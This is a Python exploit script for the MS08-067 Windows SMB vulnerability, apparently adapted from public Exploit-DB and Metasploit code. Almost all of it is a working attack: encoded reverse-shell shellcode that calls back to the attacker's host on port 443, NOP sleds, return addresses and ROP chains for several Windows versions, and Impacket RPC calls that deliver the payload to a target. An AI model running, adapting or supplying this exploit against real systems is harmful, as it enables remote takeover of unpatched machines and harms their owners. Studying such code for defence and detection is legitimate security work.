import struct
import time
import sys


from threading import Thread   


try:

    from impacket import smb

    from impacket import uuid

    from impacket import dcerpc

    from impacket.dcerpc.v5 import transport


except ImportError, _:

    print 'Install the following library to make this script work'

    print 'Impacket : http://oss.coresecurity.com/projects/impacket.html'

    print 'PyCrypto : http://www.amk.ca/python/code/crypto.html'

    sys.exit(1)


print '########################################################3######################################################################'

print '#   MS08-067 Exploit'

print '#   This is a modified verion of Debasis Mohanty\'s code (https://www.exploit-db.com/exploits/7132/).'

print '#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi'

print '#   This code has been remodified by WillChaos to dynamically build the reverse shell without needing to play with msfvenom'


print '##############################################################################################################################\n'


#Badchars \x00\x0a\x0d\x5c\x5f\x2f\x2e\x40;
#ATLEAST 30 NOPS REQUIRED
#Payload size: 380 bytes + 30 NOPs
#EXITFUNC=thread Important! - keeps a reliable shell without server bluescreen
#msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=443 -f c -a x86 --platform windows EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" 


#generated 348 bytes
# so we will need 380 - 348 bytes of extra nopes = 32 extra nops
msfv_shellcode = (
"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x38\xfe\x38\x30\x83\xee\xfc\xe2\xf4\xc4\x16\xba\x30\x38\xfe"
"\x58\xb9\xdd\xcf\xf8\x54\xb3\xae\x08\xbb\x6a\xf2\xb3\x62\x2c"
"\x75\x4a\x18\x37\x49\x72\x16\x09\x01\x94\x0c\x59\x82\x3a\x1c"
"\x18\x3f\xf7\x3d\x39\x39\xda\xc2\x6a\xa9\xb3\x62\x28\x75\x72"
"\x0c\xb3\xb2\x29\x48\xdb\xb6\x39\xe1\x69\x75\x61\x10\x39\x2d"
"\xb3\x79\x20\x1d\x02\x79\xb3\xca\xb3\x31\xee\xcf\xc7\x9c\xf9"
"\x31\x35\x31\xff\xc6\xd8\x45\xce\xfd\x45\xc8\x03\x83\x1c\x45"
"\xdc\xa6\xb3\x68\x1c\xff\xeb\x56\xb3\xf2\x73\xbb\x60\xe2\x39"
"\xe3\xb3\xfa\xb3\x31\xe8\x77\x7c\x14\x1c\xa5\x63\x51\x61\xa4"
"\x69\xcf\xd8\xa1\x67\x6a\xb3\xec\xd3\xbd\x65\x96\x0b\x02\x38"
"\xfe\x50\x47\x4b\xcc\x67\x64\x50\xb2\x4f\x16\x3f\x01\xed\x88"
"\xa8\xff\x38\x30\x11\x3a\x6c\x60\x50\xd7\xb8\x5b\x38\x01\xed"
"\x60\x68\xae\x68\x70\x68\xbe\x68\x58\xd2\xf1\xe7\xd0\xc7\x2b"
"\xaf\x5a\x3d\x96\x32\x3a\x36\xfd\x50\x32\x38\xff\x83\xb9\xde"
"\x94\x28\x66\x6f\x96\xa1\x95\x4c\x9f\xc7\xe5\xbd\x3e\x4c\x3c"
"\xc7\xb0\x30\x45\xd4\x96\xc8\x85\x9a\xa8\xc7\xe5\x50\x9d\x55"
"\x54\x38\x77\xdb\x67\x6f\xa9\x09\xc6\x52\xec\x61\x66\xda\x03"
"\x5e\xf7\x7c\xda\x04\x31\x39\x73\x7c\x14\x28\x38\x38\x74\x6c"
"\xae\x6e\x66\x6e\xb8\x6e\x7e\x6e\xa8\x6b\x66\x50\x87\xf4\x0f"
"\xbe\x01\xed\xb9\xd8\xb0\x6e\x76\xc7\xce\x50\x38\xbf\xe3\x58"
"\xcf\xed\x45\xd8\x2d\x12\xf4\x50\x96\xad\x43\xa5\xcf\xed\xc2"
"\x3e\x4c\x32\x7e\xc3\xd0\x4d\xfb\x83\x77\x2b\x8c\x57\x5a\x38"
"\xad\xc7\xe5"
)


# this is the mandatory 32 byte nopsled
nopsled_shellcode = "\x90" * 32

# this is to be dynamically written to tail the msfvenom shellcode 
# whatever amount of bytes are remaning after msfvenom should be written here
leftover_bytes_padding = "\x90" * 32

# building final payload shellcode
shellcode = nopsled_shellcode + msfv_shellcode + leftover_bytes_padding


nonxjmper = "\x08\x04\x02\x00%s"+"A"*4+"%s"+"A"*42+"\x90"*8+"\xeb\x62"+"A"*10
disableNXjumper = "\x08\x04\x02\x00%s%s%s"+"A"*28+"%s"+"\xeb\x02"+"\x90"*2+"\xeb\x62"
ropjumper = "\x00\x08\x01\x00"+"%s"+"\x10\x01\x04\x01";
module_base = 0x6f880000
def generate_rop(rvas):
	gadget1="\x90\x5a\x59\xc3"
	gadget2 = ["\x90\x89\xc7\x83", "\xc7\x0c\x6a\x7f", "\x59\xf2\xa5\x90"]	
	gadget3="\xcc\x90\xeb\x5a"	
	ret=struct.pack('<L', 0x00018000)
	ret+=struct.pack('<L', rvas['call_HeapCreate']+module_base)
	ret+=struct.pack('<L', 0x01040110)
	ret+=struct.pack('<L', 0x01010101)
	ret+=struct.pack('<L', 0x01010101)
	ret+=struct.pack('<L', rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret']+module_base)
	ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
	ret+=gadget1
	ret+=struct.pack('<L', rvas['mov [eax], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['jmp eax']+module_base)
	ret+=gadget2[0]
	ret+=gadget2[1]
	ret+=struct.pack('<L', rvas['mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
	ret+=gadget2[2]
	ret+=struct.pack('<L', rvas['mov [eax+0x10], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['add eax, 8 / ret']+module_base)
	ret+=struct.pack('<L', rvas['jmp eax']+module_base)
	ret+=gadget3	
	return ret
class SRVSVC_Exploit(Thread):

    def __init__(self, target, os, port=445):

        super(SRVSVC_Exploit, self).__init__()

        self.__port   = port

        self.target   = target
	self.os	      = os


    def __DCEPacket(self):
	if (self.os=='1'):
		print 'Windows XP SP0/SP1 Universal\n'
		ret = "\x61\x13\x00\x01"
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='2'):
		print 'Windows 2000 Universal\n'
		ret = "\xb0\x1c\x1f\x00"
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='3'):
		print 'Windows 2003 SP0 Universal\n'
		ret = "\x9e\x12\x00\x01"  #0x01 00 12 9e
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='4'):
		print 'Windows 2003 SP1 English\n'
		ret_dec = "\x8c\x56\x90\x7c"  #0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
		ret_pop = "\xf4\x7c\xa2\x7c"  #0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
		jmp_esp = "\xd3\xfe\x86\x7c" #0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
		disable_nx = "\x13\xe4\x83\x7c" #0x 7c 83 e4 13 NX disable @NTDLL.DLL
		jumper = disableNXjumper % (ret_dec*6, ret_pop, disable_nx, jmp_esp*2)
	elif (self.os=='5'):
		print 'Windows XP SP3 French (NX)\n'
		ret = "\x07\xf8\x5b\x59"  #0x59 5b f8 07 
		disable_nx = "\xc2\x17\x5c\x59" #0x59 5c 17 c2 
		jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
	elif (self.os=='6'):
		print 'Windows XP SP3 English (NX)\n'
		ret = "\x07\xf8\x88\x6f"  #0x6f 88 f8 07 
		disable_nx = "\xc2\x17\x89\x6f" #0x6f 89 17 c2 
		jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
	elif (self.os=='7'):
		print 'Windows XP SP3 English (AlwaysOn NX)\n'
		rvasets = {'call_HeapCreate': 0x21286,'add eax, ebp / mov ecx, 0x59ffffa8 / ret' : 0x2e796,'pop ecx / ret':0x2e796 + 6,'mov [eax], ecx / ret':0xd296,'jmp eax':0x19c6f,'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret':0x10a56,'mov [eax+0x10], ecx / ret':0x10a56 + 6,'add eax, 8 / ret':0x29c64}
		jumper = generate_rop(rvasets)+"AB"  #the nonxjmper also work in this case.
	else:
		print 'Not supported OS version\n'
		sys.exit(-1)
	print '[-]Initiating connection'

        self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)

        self.__trans.connect()

        print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target

        self.__dce = self.__trans.DCERPC_class(self.__trans)

        self.__dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))




        path ="\x5c\x00"+"ABCDEFGHIJ"*10 + shellcode +"\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" + "\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00"  + jumper + "\x00" * 2

        server="\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
        prefix="\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"

        self.__stub=server+"\x36\x01\x00\x00\x00\x00\x00\x00\x36\x01\x00\x00" + path +"\xE8\x03\x00\x00"+prefix+"\x01\x10\x00\x00\x00\x00\x00\x00"

        return



    def run(self):

        self.__DCEPacket()

        self.__dce.call(0x1f, self.__stub) 
        time.sleep(5)
        print 'Exploit finish\n'



if __name__ == '__main__':

       try:

           target = sys.argv[1]
	   #lhost  = sys.argv[2]
           os     = sys.argv[2]

       except IndexError:

				print '\nUsage: %s <target ip> <Local ip> [option]\n' % sys.argv[0]
				print ' '
			        print '-----------------------------------------options------------------------------------------------'
				print ' [1]  for Windows XP SP0/SP1 Universal\n'
				print ' [2]  for Windows 2000 Universal\n'
				print ' [3]  for Windows 2003 SP0 Universal\n'
                                print ' [4]  for Windows 2003 SP1 English\n'
                                print ' [5]  for Windows XP SP3 French (NX)\n'
                                print ' [6]  for Windows XP SP3 English (NX)\n'
                                print ' [7]  for Windows XP SP3 English (AlwaysOn NX)'
				print '------------------------------------------------------------------------------------------------'
				print ' <target IP> is used to determine the remote host in which to fire the exploit at               '
				print ' <Local IP> is used to determine dynamic shellcode generation, shell will call back on port 443 '
				print ' [Option] is to set the correct OS type, insuring the correct return address is set             '
                                print '                                 :) WillChaos                                                   '
                                print '________________________________________________________________________________________________'
				sys.exit(-1)



current = SRVSVC_Exploit(target, os)

current.start()
